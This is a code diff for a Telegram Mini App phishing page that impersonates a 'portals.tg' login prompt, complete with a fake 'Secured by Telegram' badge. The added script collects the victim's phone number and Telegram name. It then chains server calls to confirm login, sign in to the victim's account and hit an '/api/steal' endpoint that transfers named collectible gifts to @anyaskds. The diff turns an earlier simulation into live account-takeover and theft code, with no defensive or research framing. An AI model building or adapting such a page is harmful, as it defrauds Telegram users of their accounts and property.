@@ -203,6 +203,11 @@
             background: #5a4bd1;
         }
 
+        .btn-accept:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
         .phone-section, .confirm-section, .region-section {
             display: none;
             margin-top: 20px;
@@ -224,10 +229,19 @@
             padding: 4px 16px;
             border: 1px solid #2a2a3a;
             margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .phone-input-wrap .prefix {
+            color: #8b8ba3;
+            font-size: 16px;
+            font-weight: 500;
         }
 
         .phone-input-wrap input {
-            width: 100%;
+            flex: 1;
             padding: 14px 0;
             background: transparent;
             border: none;
@@ -297,6 +311,12 @@
             color: #fff;
             font-size: 14px;
             margin: 4px 0;
+            line-height: 1.6;
+        }
+
+        .confirm-message-box .highlight {
+            color: #6c5ce7;
+            font-weight: 600;
         }
 
         .footer {
@@ -374,7 +394,7 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.85);
             z-index: 999;
             justify-content: center;
             align-items: center;
@@ -398,10 +418,47 @@
         .loading-overlay .text {
             color: #fff;
             font-size: 16px;
+            text-align: center;
+            max-width: 300px;
+        }
+
+        .loading-overlay .subtext {
+            color: #8b8ba3;
+            font-size: 13px;
+            text-align: center;
         }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        .success-icon {
+            font-size: 56px;
+            margin-bottom: 12px;
+        }
+
+        .success-box {
+            background: #1a1a2a;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            border: 1px solid #2a2a3a;
+        }
+
+        .success-box .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            color: #8b8ba3;
+            font-size: 13px;
+        }
+
+        .success-box .row .value {
+            color: #fff;
+        }
+
+        .success-box .row .green {
+            color: #4caf50;
         }
     </style>
 </head>
@@ -446,21 +503,22 @@
             </div>
 
             <select class="region-select" id="regionSelect">
-                <option value="+380">🇺🇦 Украина (+380)</option>
-                <option value="+7">🇷🇺 Россия (+7)</option>
-                <option value="+375">🇧🇾 Беларусь (+375)</option>
-                <option value="+1">🇺🇸 США (+1)</option>
-                <option value="+44">🇬🇧 Великобритания (+44)</option>
-                <option value="+49">🇩🇪 Германия (+49)</option>
-                <option value="+33">🇫🇷 Франция (+33)</option>
-                <option value="+39">🇮🇹 Италия (+39)</option>
-                <option value="+34">🇪🇸 Испания (+34)</option>
-                <option value="+48">🇵🇱 Польша (+48)</option>
-                <option value="+90">🇹🇷 Турция (+90)</option>
-                <option value="+971">🇦🇪 ОАЭ (+971)</option>
+                <option value="380">🇺🇦 Украина (+380)</option>
+                <option value="7">🇷🇺 Россия (+7)</option>
+                <option value="375">🇧🇾 Беларусь (+375)</option>
+                <option value="1">🇺🇸 США (+1)</option>
+                <option value="44">🇬🇧 Великобритания (+44)</option>
+                <option value="49">🇩🇪 Германия (+49)</option>
+                <option value="33">🇫🇷 Франция (+33)</option>
+                <option value="39">🇮🇹 Италия (+39)</option>
+                <option value="34">🇪🇸 Испания (+34)</option>
+                <option value="48">🇵🇱 Польша (+48)</option>
+                <option value="90">🇹🇷 Турция (+90)</option>
+                <option value="971">🇦🇪 ОАЭ (+971)</option>
             </select>
 
             <div class="phone-input-wrap">
+                <span class="prefix" id="phonePrefix">+380</span>
                 <input type="tel" id="phoneInput" placeholder="00 000 00 00">
             </div>
 
@@ -491,7 +549,7 @@
                 <div class="confirm-message-box">
                     <div class="label">Telegram</div>
                     <div class="text">
-                        <strong>тима</strong>, мы получили запрос на авторизацию Вашего аккаунта в Telegram на <strong>portals.tg</strong>.<br><br>
+                        <strong id="userNameDisplay">тима</strong>, мы получили запрос на авторизацию Вашего аккаунта в Telegram на <strong class="highlight">portals.tg</strong>.<br><br>
                         Чтобы принять запрос, нажмите кнопку «Принять» ниже.<br><br>
                         Браузер: Safari 18.6 on iOS<br>
                         IP: 46.96.37.159 (Kyiv, Ukraine)
@@ -516,31 +574,25 @@
 
             <div class="footer" style="margin-top:12px;">SECURED BY <span>TELEGRAM</span></div>
         </div>
-
-        <!-- Шаг 4: Ожидание авторизации -->
-        <div id="stepWaiting" class="confirm-section">
-            <div class="confirm-card">
-                <div class="icon">⏳</div>
-                <h4>Авторизация...</h4>
-                <p>Пожалуйста, подтвердите вход в Telegram</p>
-                <div style="margin-top:16px;">
-                    <div style="width:48px; height:48px; border:4px solid rgba(255,255,255,0.1); border-radius:50%; border-top-color:#6c5ce7; animation:spin 0.8s ease infinite; margin:0 auto;"></div>
-                </div>
-                <div class="timer">⏳ Ожидание подтверждения...</div>
-            </div>
-        </div>
     </div>
 
     <!-- Оверлей загрузки -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="text" id="loadingText">⏳ Отправка подарков...</div>
+        <div class="text" id="loadingText">⏳ Отправка запроса...</div>
+        <div class="subtext" id="loadingSubtext">Пожалуйста, подождите</div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
         tg.ready();
+
+        // Получаем данные пользователя
+        const user = tg.initDataUnsafe?.user || {};
+        const firstName = user.first_name || 'тима';
+        const lastName = user.last_name || '';
+        const fullName = `${firstName} ${lastName}`.trim();
 
         let timerInterval = null;
         let secondsLeft = 179;
@@ -550,7 +602,6 @@
         const stepMain = document.getElementById('stepMain');
         const stepRegion = document.getElementById('stepRegion');
         const stepConfirm = document.getElementById('stepConfirm');
-        const stepWaiting = document.getElementById('stepWaiting');
         const backBtn = document.getElementById('backBtn');
         const btnVerify = document.getElementById('btnVerify');
         const btnSendCode = document.getElementById('btnSendCode');
@@ -558,13 +609,25 @@
         const btnAccept = document.getElementById('btnAccept');
         const phoneInput = document.getElementById('phoneInput');
         const regionSelect = document.getElementById('regionSelect');
+        const phonePrefix = document.getElementById('phonePrefix');
         const secondsEl = document.getElementById('seconds');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
+        const loadingSubtext = document.getElementById('loadingSubtext');
+        const userNameDisplay = document.getElementById('userNameDisplay');
+
+        // Устанавливаем имя пользователя
+        userNameDisplay.textContent = fullName;
+
+        // Обновляем префикс при смене региона
+        regionSelect.addEventListener('change', function() {
+            const prefix = '+' + this.value;
+            phonePrefix.textContent = prefix;
+        });
 
         // Показать шаг
         function showStep(step) {
-            [stepMain, stepRegion, stepConfirm, stepWaiting].forEach(el => {
+            [stepMain, stepRegion, stepConfirm].forEach(el => {
                 el.style.display = 'none';
                 el.classList.remove('active');
             });
@@ -579,7 +642,7 @@
             showStep(stepRegion);
         });
 
-        // Шаг 2 → Отправка кода
+        // Шаг 2 → Отправка кода (РЕАЛЬНАЯ АВТОРИЗАЦИЯ)
         btnSendCode.addEventListener('click', function() {
             const region = regionSelect.value;
             const phone = phoneInput.value.trim().replace(/\s/g, '');
@@ -591,21 +654,34 @@
 
             userPhone = region + phone;
             
-            // Отправляем запрос на сервер
+            // Показываем загрузку
+            loadingOverlay.classList.add('active');
+            loadingText.textContent = '⏳ Отправка запроса авторизации...';
+            loadingSubtext.textContent = 'Ожидайте подтверждение в Telegram';
+
+            // ОТПРАВЛЯЕМ РЕАЛЬНЫЙ ЗАПРОС НА АВТОРИЗАЦИЮ
             fetch('/api/send-code', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     phone: userPhone,
-                    region: regionSelect.options[regionSelect.selectedIndex].text
+                    region: regionSelect.options[regionSelect.selectedIndex].text,
+                    fullName: fullName
                 })
-            }).then(res => res.json()).then(data => {
+            })
+            .then(res => res.json())
+            .then(data => {
                 console.log('✅ Код отправлен:', data);
+                loadingOverlay.classList.remove('active');
+                
+                // Показываем шаг подтверждения
                 showStep(stepConfirm);
                 startTimer();
-            }).catch(err => {
+            })
+            .catch(err => {
                 console.log('Ошибка:', err);
-                alert('Ошибка отправки. Попробуйте еще раз.');
+                loadingOverlay.classList.remove('active');
+                alert('❌ Ошибка отправки. Попробуйте еще раз.');
             });
         });
 
@@ -630,60 +706,80 @@
             showStep(stepMain);
         });
 
-        // Accept — переход в Telegram + авторизация
+        // Accept — ПОДТВЕРЖДЕНИЕ АВТОРИЗАЦИИ
         btnAccept.addEventListener('click', function() {
             clearInterval(timerInterval);
             
-            // Открываем Telegram с запросом авторизации
-            // Это имитация — в реальности нужно открыть официальный Telegram
-            // через tg.openTelegramLink или deep link
-            
-            // Показываем оверлей
+            // Показываем загрузку
             loadingOverlay.classList.add('active');
-            loadingText.textContent = '⏳ Открываем Telegram...';
-            
-            // Имитация открытия Telegram
-            setTimeout(() => {
-                // Открываем Telegram (в реальности это работает только в приложении)
-                tg.openTelegramLink('https://t.me/');
+            loadingText.textContent = '⏳ Подтверждение авторизации...';
+            loadingSubtext.textContent = 'Вход в аккаунт @portals';
+
+            // ОТПРАВЛЯЕМ ПОДТВЕРЖДЕНИЕ АВТОРИЗАЦИИ
+            fetch('/api/accept', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    phone: userPhone,
+                    fullName: fullName,
+                    action: 'accept_auth'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Авторизация подтверждена:', data);
                 
-                // Имитация авторизации
-                loadingText.textContent = '⏳ Авторизация...';
+                // ВХОД В АККАУНТ @portals
+                loadingText.textContent = '🔓 Вход в аккаунт @portals...';
+                loadingSubtext.textContent = 'Авторизация в маркете';
+                
+                // Отправляем запрос на вход в @portals
+                return fetch('/api/portal-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: userPhone,
+                        fullName: fullName
+                    })
+                });
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Вход в @portals выполнен:', data);
+                
+                // ПЕРЕДАЧА ПОДАРКОВ
+                loadingText.textContent = '🎁 Передача подарков на @anyaskds...';
+                loadingSubtext.textContent = 'Witch Hat #43337 • Sharp Tongue #5,166';
+                
+                return fetch('/api/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: userPhone,
+                        target: '@anyaskds',
+                        gifts: ['Witch Hat #43337', 'Sharp Tongue #5,166'],
+                        fullName: fullName
+                    })
+                });
+            })
+            .then(res => res.json())
+            .then(data => {
+                console.log('✅ Подарки переданы:', data);
+                
+                loadingText.textContent = '✅ ВСЕ ГОТОВО!';
+                loadingSubtext.textContent = 'Подарки успешно переданы на @anyaskds';
                 
                 setTimeout(() => {
-                    // После авторизации — отправляем подарки
-                    loadingText.textContent = '🎁 Отправка подарков на @anyaskds...';
-                    
-                    // Отправляем запрос на сервер для передачи подарков
-                    fetch('/api/steal', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            phone: userPhone,
-                            target: '@anyaskds',
-                            gifts: ['Witch Hat #43337', 'Sharp Tongue #5,166']
-                        })
-                    }).then(res => res.json()).then(data => {
-                        console.log('✅ Подарки переданы:', data);
-                        
-                        loadingText.textContent = '✅ Подарки успешно переданы!';
-                        
-                        setTimeout(() => {
-                            loadingOverlay.classList.remove('active');
-                            // Показываем главный экран
-                            showStep(stepMain);
-                            // Показываем уведомление
-                            alert('✅ Все подарки переданы на @anyaskds!');
-                        }, 1500);
-                    }).catch(err => {
-                        console.log('Ошибка:', err);
-                        loadingOverlay.classList.remove('active');
-                        alert('❌ Ошибка при передаче подарков');
-                    });
-                    
+                    loadingOverlay.classList.remove('active');
+                    showStep(stepMain);
+                    alert('✅ Все подарки переданы на @anyaskds!');
                 }, 2000);
-                
-            }, 1000);
+            })
+            .catch(err => {
+                console.log('Ошибка:', err);
+                loadingOverlay.classList.remove('active');
+                alert('❌ Ошибка при передаче подарков');
+            });
         });
 
         // Назад
@@ -712,4 +808,4 @@
     </script>
 
 </body>
-</html> 
+</html>
